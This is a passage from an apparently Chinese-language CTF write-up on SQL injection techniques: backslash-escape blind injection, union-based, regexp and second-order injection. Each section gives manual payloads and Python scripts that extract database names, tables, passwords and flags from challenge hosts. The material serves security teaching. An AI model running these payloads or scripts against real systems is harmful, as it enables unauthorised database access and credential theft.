反引号转义</p><p><strong>思路：</strong></p><p>后台源代码有提示image.php，dirsearch发现image.php.bak文件泄露，get型传入id和path两个参数，存在反斜杠转义导致单引号逃逸。</p><p><strong>手注payload:</strong></p><pre><code>image.php?id=\0&amp;path=or%20id=1%23image.php?id=\0&amp;path=or%20id=0%23这两条回显不同，利用此处进行盲注-----------------------------------------------------------------------------------------select * from images where id=&#39;\&#39; or path=&#39;or id=if(ascii(substr((select database()),{},1))&gt;{},1,0)#&#39;</code></pre><p><strong>题目源码：</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">include</span> <span class="token string">"config.php"</span><span class="token punctuation">;</span><span class="token variable">$id</span><span class="token operator">=</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string">"1"</span><span class="token punctuation">;</span><span class="token variable">$path</span><span class="token operator">=</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"path"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"path"</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string">""</span><span class="token punctuation">;</span><span class="token variable">$id</span><span class="token operator">=</span><span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$path</span><span class="token operator">=</span><span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$id</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"\\0"</span><span class="token punctuation">,</span><span class="token string">"%00"</span><span class="token punctuation">,</span><span class="token string">"\\'"</span><span class="token punctuation">,</span><span class="token string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$path</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"\\0"</span><span class="token punctuation">,</span><span class="token string">"%00"</span><span class="token punctuation">,</span><span class="token string">"\\'"</span><span class="token punctuation">,</span><span class="token string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment">#双引号里的\\0其实就相当于\0，这个过滤条件就是把\0替换为空。</span><span class="token shell-comment comment">#构造$id为任意个\再加一个0就ok了，任意个数的\经过addslashes都变成偶数个了，吃掉一个\0，刚好可以逸出一个\来转义后面的那个单引号。</span><span class="token shell-comment comment">#写python脚本的时候需要注意，引号里两个\\才相当于一个\字符</span><span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span><span class="token string">"select * from images where id='{$id}' or path='{$path}'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$row</span><span class="token operator">=</span><span class="token function">mysqli_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">,</span><span class="token constant">MYSQLI_ASSOC</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$path</span><span class="token operator">=</span><span class="token string">"./"</span> <span class="token punctuation">.</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">"path"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Content-Type: image/jpeg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">readfile</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>脚本1：</strong></p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">from</span> urllib <span class="token keyword">import</span> parseurl <span class="token operator">=</span> <span class="token string">'http://203.195.224.127:30008/image.php?id={}&amp;path={}'</span>result <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    high <span class="token operator">=</span> <span class="token number">127</span>    low <span class="token operator">=</span> <span class="token number">32</span>    mid <span class="token operator">=</span> <span class="token punctuation">(</span>high<span class="token operator">+</span>low<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span>    <span class="token keyword">while</span> high<span class="token operator">></span>low<span class="token punctuation">:</span>        id <span class="token operator">=</span> parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span><span class="token string">'\\0'</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># payload = 'or id=if(ascii(substr((select database()),{},1))>{},1,0)#'</span>        <span class="token comment" spellcheck="true"># payload = 'or id=if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema = database()),{},1))>{},1,0)#'</span>        <span class="token comment" spellcheck="true"># payload ='or id=if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name = 0x7573657273),{},1))>{},1,0)#'</span>        payload <span class="token operator">=</span> <span class="token string">"or id=if(ascii(substr((select password from users limit 1 offset 0),{},1))>{},1,0)#"</span>        payload <span class="token operator">=</span> parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>payload<span class="token punctuation">.</span>format<span class="token punctuation">(</span>i<span class="token punctuation">,</span>mid<span class="token punctuation">)</span><span class="token punctuation">)</span>        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">.</span>format<span class="token punctuation">(</span>id<span class="token punctuation">,</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># print(url.format(id,payload))</span>        <span class="token keyword">if</span> b<span class="token string">'JFIF'</span> <span class="token keyword">in</span> res<span class="token punctuation">.</span>content<span class="token punctuation">:</span>            <span class="token comment" spellcheck="true"># print(url.format(id,payload))</span>            low <span class="token operator">=</span> mid<span class="token operator">+</span><span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            high <span class="token operator">=</span> mid        mid <span class="token operator">=</span> <span class="token punctuation">(</span>high<span class="token operator">+</span>low<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span>    result <span class="token operator">+=</span>chr<span class="token punctuation">(</span>int<span class="token punctuation">(</span>mid<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>脚本2：</strong>(这样就可以不用对payload进行url编码)</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">'http://203.195.224.127:30008/image.php'</span>result <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    high <span class="token operator">=</span> <span class="token number">127</span>    low <span class="token operator">=</span> <span class="token number">32</span>    mid <span class="token operator">=</span> <span class="token punctuation">(</span>high<span class="token operator">+</span>low<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span>    <span class="token keyword">while</span> high<span class="token operator">></span>low<span class="token punctuation">:</span>        payload <span class="token operator">=</span> <span class="token string">"or id=if(ascii(substr((select password from users limit 1 offset 0),%d,1))>%d,1,0)#"</span><span class="token operator">%</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>mid<span class="token punctuation">)</span>        params <span class="token operator">=</span> <span class="token punctuation">{</span>            <span class="token string">'path'</span> <span class="token punctuation">:</span> payload<span class="token punctuation">,</span>            <span class="token string">'id'</span> <span class="token punctuation">:</span> <span class="token string">'\\0'</span>        <span class="token punctuation">}</span>        res1 <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>params <span class="token operator">=</span> params<span class="token punctuation">)</span>        res2 <span class="token operator">=</span> res1<span class="token punctuation">.</span>content        <span class="token keyword">if</span> b<span class="token string">'JFIF'</span> <span class="token keyword">in</span> res2<span class="token punctuation">:</span>            low <span class="token operator">=</span> mid<span class="token operator">+</span><span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            high <span class="token operator">=</span> mid        mid <span class="token operator">=</span> <span class="token punctuation">(</span>high<span class="token operator">+</span>low<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span>    result <span class="token operator">+=</span>chr<span class="token punctuation">(</span>int<span class="token punctuation">(</span>mid<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-1-2-Black-Watch-入群题-buu"><a href="#3-1-2-Black-Watch-入群题-buu" class="headerlink" title="3.1.2  [Black Watch 入群题]  (buu)"></a>3.1.2  [Black Watch 入群题]  (buu)</h3><p><strong>类型：</strong>get型 + 整型盲注（无单引号闭合）</p><p><strong>过滤字符：</strong></p><pre><code>空格、/**/、+、&amp;&amp;</code></pre><p><strong>思路：</strong></p><p>这道题很典型，没有注册页面，只有登录页面，评论页上有参数id，fuzz发现有过滤，大概率注入点。过滤字符如上，并且?id=1后面如果加上+等字符会回显hacker，加上or则没问题，但是利用or是实现不了盲注的。</p><p>因此，本题思路就是?id后面直接跟if判断语句，通过1或者0来实现盲注。</p><p>本题有三种回显：1、正常回显    2、400 Bad Request（如果有空格）    3、[]  </p><p><strong>手注payload：</strong></p><pre><code>?id=1or1#回显为空，语法就有问题，相当于去查id=1or1#，自然没有内容可以回显，出现[]。?id=(1)or(1)#改为这样会爆hacker?id=if(1&gt;1,1,0)和?id=if(1&gt;1,0,1)回显不同，证实存在注入。</code></pre><p><strong>exp:</strong></p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">import</span> requestsflag <span class="token operator">=</span> <span class="token string">''</span>url <span class="token operator">=</span> <span class="token string">'http://ba0db0b5-3d0e-4be0-8d3b-43627a5d42dd.node3.buuoj.cn/backend/content_detail.php?id={}'</span>result <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    high <span class="token operator">=</span> <span class="token number">127</span>    low <span class="token operator">=</span> <span class="token number">32</span>    mid <span class="token operator">=</span> <span class="token punctuation">(</span>high<span class="token operator">+</span>low<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span>    <span class="token keyword">while</span> high<span class="token operator">></span>low<span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># payload = "if(ascii(substr((select(database())),%d,1))>%d,1,0)#"%(i,mid)</span>        <span class="token comment" spellcheck="true"># payload = "if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=database()),%d,1))>%d,1,0)#"%(i,mid)</span>        <span class="token comment" spellcheck="true"># payload = "if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)='admin'),%d,1))>%d,1,0)#"%(i,mid)</span>        <span class="token comment" spellcheck="true"># payload = "if(ascii(substr((select(group_concat(password))from(admin)),%d,1))>%d,1,0)#"%(i,mid)</span>        payload <span class="token operator">=</span> <span class="token string">"if(ascii(substr((select(group_concat(username))from(admin)),%d,1))>%d,1,0)#"</span><span class="token operator">%</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>mid<span class="token punctuation">)</span>        res1 <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">.</span>format<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">if</span> b<span class="token string">'\u4e0b'</span> <span class="token keyword">in</span> res1<span class="token punctuation">.</span>content<span class="token punctuation">:</span>            low <span class="token operator">=</span> mid<span class="token operator">+</span><span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            high <span class="token operator">=</span> mid        mid <span class="token operator">=</span> <span class="token punctuation">(</span>high<span class="token operator">+</span>low<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span>    result <span class="token operator">+=</span>chr<span class="token punctuation">(</span>int<span class="token punctuation">(</span>mid<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-2-union-bool盲注"><a href="#3-2-union-bool盲注" class="headerlink" title="3.2  union+bool盲注"></a>3.2  union+bool盲注</h2><h3 id="3-2-1-easy-sql（1）"><a href="#3-2-1-easy-sql（1）" class="headerlink" title="3.2.1  easy_sql（1）"></a>3.2.1  easy_sql（1）</h3><p><strong>参考资料：</strong></p><p><strong>1、</strong>easy_sql：<a href="http://note.youdao.com/noteshare?id=c249ed9e68f1760cea6bc6a1f53ab0eb&amp;sub=0BCF7BDB985F4ABD8CD407106926E742" target="_blank" rel="noopener">http://note.youdao.com/noteshare?id=c249ed9e68f1760cea6bc6a1f53ab0eb&amp;sub=0BCF7BDB985F4ABD8CD407106926E742</a></p><p><strong>类型：</strong></p><p>union覆盖+过滤空格</p><p><strong>思路：</strong></p><p>这道题用户名处无论输入什么，都会显示username error，猜测后台查询语句其实一直是返回为空的，那么就用union select进行覆盖。覆盖后密码处测试密码是我们输入的哪个字符，从而判断密码位于哪个字段，利用登陆成功的无回显和密码错的password error实现盲注。</p><p><strong>手注payload：</strong></p><pre><code>username=guest&#39;%0aorder%0aby%0a1%23&amp;password=123username=guest&#39;%0aorder%0aby%0a1000000000000%23&amp;password=123这两条payload都显示username error，猜测本题原始的sql语句是没有回显的，或者说查询始终是为空的。-----------------------------------------------------------------------------------------username=1&#39;union%0aselect%0a1,2#&amp;password=2username=1&#39;union%0aselect%0a1,2#&amp;password=1回显不同，可以盲注！！！</code></pre><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> repattern <span class="token operator">=</span> <span class="token string">'.*?flag{.*?}.*?'</span>res <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>base_url <span class="token operator">=</span> <span class="token string">'http://101.200.219.195:9001/index.php'</span>result <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    high <span class="token operator">=</span> <span class="token number">127</span>    low <span class="token operator">=</span> <span class="token number">32</span>    mid <span class="token operator">=</span> <span class="token punctuation">(</span>high<span class="token operator">+</span>low<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span>    <span class="token keyword">while</span> high<span class="token operator">></span>low<span class="token punctuation">:</span>        data <span class="token operator">=</span> <span class="token punctuation">{</span>            <span class="token string">'username'</span> <span class="token punctuation">:</span> <span class="token string">"1'union(select(1),(if(ascii(substr((select(flag)from(flag)),{},1))>{},1,2)));#"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>i<span class="token punctuation">,</span>mid<span class="token punctuation">)</span><span class="token punctuation">,</span>            <span class="token string">'password'</span> <span class="token punctuation">:</span> <span class="token string">'2'</span><span class="token punctuation">,</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">#payload里面不能出现url编码的，比如上面的#变成%23，就会出错</span>        res1 <span class="token operator">=</span> res<span class="token punctuation">.</span>post<span class="token punctuation">(</span>base_url<span class="token punctuation">,</span>data <span class="token operator">=</span> data<span class="token punctuation">)</span>        res2 <span class="token operator">=</span> res1<span class="token punctuation">.</span>content        <span class="token keyword">if</span> b<span class="token string">'password error'</span> <span class="token keyword">in</span> res2<span class="token punctuation">:</span>        <span class="token comment" spellcheck="true">#在这道题里，用不用b都可以</span>        <span class="token comment" spellcheck="true">#在有些题里不加b的话就会报错 TypeError: a bytes-like object is required, not 'str'</span>            low <span class="token operator">=</span> mid<span class="token operator">+</span><span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            high <span class="token operator">=</span> mid        mid <span class="token operator">=</span> <span class="token punctuation">(</span>high<span class="token operator">+</span>low<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span>    result <span class="token operator">+=</span>chr<span class="token punctuation">(</span>int<span class="token punctuation">(</span>mid<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>pattern<span class="token punctuation">,</span>result<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span>        <span class="token keyword">break</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-3-正则盲注"><a href="#3-3-正则盲注" class="headerlink" title="3.3 正则盲注"></a>3.3 正则盲注</h2><h3 id="3-3-1-BJDCTF-2nd-简单注入（buu）"><a href="#3-3-1-BJDCTF-2nd-简单注入（buu）" class="headerlink" title="3.3.1  [BJDCTF 2nd]简单注入（buu）"></a>3.3.1  [BJDCTF 2nd]简单注入（buu）</h3><p><strong>类型：</strong>post型 + bool+正则盲注 + 反斜杠转义</p><p><strong>过滤字符：</strong>分号  双引号  union select  =  like</p><p><strong>手注payload：</strong>这里我们反引号转义单引号后，修改的其实是sql语句的where限定条件。</p><pre><code>username:  \password:  or !(1&lt;&gt;1)#回显不同，存在注入-----------------------------------------------------------------------------------------猜测数据库名长度，or后面的语句只有猜中数据库名长度，才会返回1or !(!(length(database())&lt;&gt;7)&lt;&gt;1)#-----------------------------------------------------------------------------------------正则盲注or password regexp binary 0x#</code></pre><p><strong>脚本正则盲注密码：</strong></p><p> 由于直接regexp匹配在3.23.4版本后是不分大小写的，要加上binary关键字 ,后面跟上^和匹配字符整体的16进制值。</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> string<span class="token keyword">def</span> <span class="token function">ord2hex</span><span class="token punctuation">(</span>string1<span class="token punctuation">)</span><span class="token punctuation">:</span>    string2 <span class="token operator">=</span><span class="token string">''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> string1<span class="token punctuation">:</span>        string2 <span class="token operator">+=</span> hex<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>    string2 <span class="token operator">=</span> string2<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">,</span><span class="token string">''</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token string">'0x'</span><span class="token operator">+</span>string2url <span class="token operator">=</span> <span class="token string">'http://7d46ba05-5d55-4ec1-8e63-a9c0c1b49f92.node3.buuoj.cn/'</span>ps1 <span class="token operator">=</span> <span class="token string">'^'</span>ps2 <span class="token operator">=</span> <span class="token string">''</span>password <span class="token operator">=</span> <span class="token string">''</span>payload <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> t <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> string<span class="token punctuation">.</span>ascii_uppercase<span class="token operator">+</span>string<span class="token punctuation">.</span>ascii_lowercase<span class="token operator">+</span>string<span class="token punctuation">.</span>digits<span class="token punctuation">:</span>        ps2 <span class="token operator">=</span> ord2hex<span class="token punctuation">(</span>ps1<span class="token operator">+</span>i<span class="token punctuation">)</span>        payload <span class="token operator">=</span> <span class="token string">"or password regexp binary {}#"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>ps2<span class="token punctuation">)</span>        data <span class="token operator">=</span> <span class="token punctuation">{</span>            <span class="token string">"username"</span> <span class="token punctuation">:</span> <span class="token string">"admin\\"</span><span class="token punctuation">,</span>            <span class="token string">"password"</span> <span class="token punctuation">:</span> payload<span class="token punctuation">,</span><span class="token punctuation">}</span>        res <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token operator">=</span>data<span class="token punctuation">)</span>        content <span class="token operator">=</span> res<span class="token punctuation">.</span>content        <span class="token keyword">if</span> b<span class="token string">'stronger'</span> <span class="token keyword">in</span> content<span class="token punctuation">:</span>            ps1 <span class="token operator">+=</span> i            password <span class="token operator">+=</span> i            <span class="token keyword">print</span><span class="token punctuation">(</span>password<span class="token punctuation">)</span>            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3-4-二次注入"><a href="#3-4-二次注入" class="headerlink" title="3.4  二次注入"></a>3.4  二次注入</h2><h3 id="3-4-1-easy-sql（2）"><a href="#3-4-1-easy-sql（2）" class="headerlink" title="3.4.1  easy_sql（2）"></a>3.4.1  easy_sql（2）</h3><p><strong>参考资料：</strong></p><p><strong>1、</strong>sql2.note    <a href="http://note.youdao.com/noteshare?id=dd6975540d0383ecbb9ff7374a590c84&amp;sub=699BDF00D87048E7A947B2B9A3BFCA99" target="_blank" rel="noopener">http://note.youdao.com/noteshare?id=dd6975540d0383ecbb9ff7374a590c84&amp;sub=699BDF00D87048E7A947B2B9A3BFCA99</a></p><p><strong>类型：</strong>get型 + 二次注入 + 反斜杠转义</p><p><strong>思路：</strong></p><p>注册后发现输入的反斜杠都被转义掉了，利用数据库字段长度有限制的特性，进行反斜杠逃逸，转义单引号，然后在登陆页面实现sql查询。</p><p><strong>手注payload：</strong></p><pre><code>注册页面实现\逃逸-----------------------------------------------------------------------------------------登陆页面，第三个字段是回显点?msgid=union select 1,2,3,4;%23</code></pre><p><strong>exp:</strong></p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding:utf-8</span><span class="token keyword">import</span> requestsres <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>base_url <span class="token operator">=</span> <span class="token string">'http://101.200.219.195:9002/'</span>register_url <span class="token operator">=</span> <span class="token string">'manage.php?action=register'</span><span class="token comment" spellcheck="true"># login_url = 'manage.php?action=login'</span>msg_url <span class="token operator">=</span> <span class="token string">'manage.php?msgid={}'</span>data_register <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token string">'username'</span> <span class="token punctuation">:</span> <span class="token string">'pperk\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\'</span><span class="token punctuation">,</span>    <span class="token string">'password'</span> <span class="token punctuation">:</span> <span class="token string">'123456'</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true"># payload = 'or 1%23'</span><span class="token comment" spellcheck="true"># payload = 'union select 1,2,3,4;%23'</span><span class="token comment" spellcheck="true"># 测试出来第三个字段是回显点</span><span class="token comment" spellcheck="true">#这里必须要把#改为%23,因为是get形式提交的</span><span class="token comment" spellcheck="true"># payload = 'union select 1,2,database(),4;%23'</span><span class="token comment" spellcheck="true"># payload = "union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database()),4;%23"</span><span class="token comment" spellcheck="true"># payload = "union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=0x7573657273),4;%23"</span><span class="token comment" spellcheck="true">#上面把users给过滤掉了，那么就用十六进制代替</span>payload <span class="token operator">=</span> <span class="token string">"union select 1,2,(select group_concat(password) from users),4;%23"</span>res_register <span class="token operator">=</span> res<span class="token punctuation">.</span>post<span class="token punctuation">(</span>base_url<span class="token operator">+</span>register_url<span class="token punctuation">,</span>data_register<span class="token punctuation">)</span>res_msg <span class="token operator">=</span> res<span class="token punctuation">.</span>get<span class="token punctuation">(</span>base_url<span class="token operator">+</span>msg_url<span class="token punctuation">.</span>format<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>res_msg<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-4-2-unfinished（2018网鼎杯）"><a href="#3-4-2-unfinished（2018网鼎杯）" class="headerlink" title="3.4.2  unfinished（2018网鼎杯）"></a>3.4.2  unfinished（2018网鼎杯）</h3><p><strong>手工注入：</strong></p><pre><code>username=0&#39;+(case when 1=1 then &#39;a&#39; else &#39;b&#39; end)=&#39;a返回登陆处显示为1</code></pre><p>其实注册的时候如果username处输入的sql语句不正确，它是不会注册成功，从侧面也暗示了此处是sql注入点。</p><p>需要将注入出的内容进行两次hex编码并截取的原因如下：</p><p><img src="/2020/04/28/best-sql/3.png" alt="unfinished"></p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> random<span class="token keyword">import</span> re<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> long_to_bytesres <span class="token operator">=</span> requests<span class="token punctuation">.</span>session<span class="token punctuation">(</span><span class="token punctuation">)</span>flag1 <span class="token operator">=</span> <span class="token string">''</span>pattern <span class="token operator">=</span> <span class="token triple-quoted-string string">'''&lt;span class="user-name">            (\d+)          &lt;/span>'''</span>url_register <span class="token operator">=</span> <span class="token string">"http://abbbf3e3-4a9b-4883-99c6-7f8ba1b73f56.node3.buuoj.cn/register.php"</span>url_login <span class="token operator">=</span> <span class="token string">"http://abbbf3e3-4a9b-4883-99c6-7f8ba1b73f56.node3.buuoj.cn/login.php"</span><span class="token comment" spellcheck="true"># payload = "0'+(select hex(hex(substr((select database()) from 1 for 10))))+'0"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> <span class="token string">"0'+(select substr(hex(hex((select * from flag))) from {} for 12))+'0"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>i<span class="token punctuation">)</span>    email <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1000000000000000000</span><span class="token punctuation">,</span><span class="token number">1001000000000000000000000000</span><span class="token punctuation">)</span>    register_data <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">"email"</span><span class="token punctuation">:</span> str<span class="token punctuation">(</span>email<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'@qq.com'</span><span class="token punctuation">,</span>        <span class="token string">"username"</span><span class="token punctuation">:</span> payload<span class="token punctuation">,</span>        <span class="token string">"password"</span><span class="token punctuation">:</span> <span class="token string">'1'</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span>    login_data <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">"email"</span><span class="token punctuation">:</span> str<span class="token punctuation">(</span>email<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">'@qq.com'</span><span class="token punctuation">,</span>        <span class="token 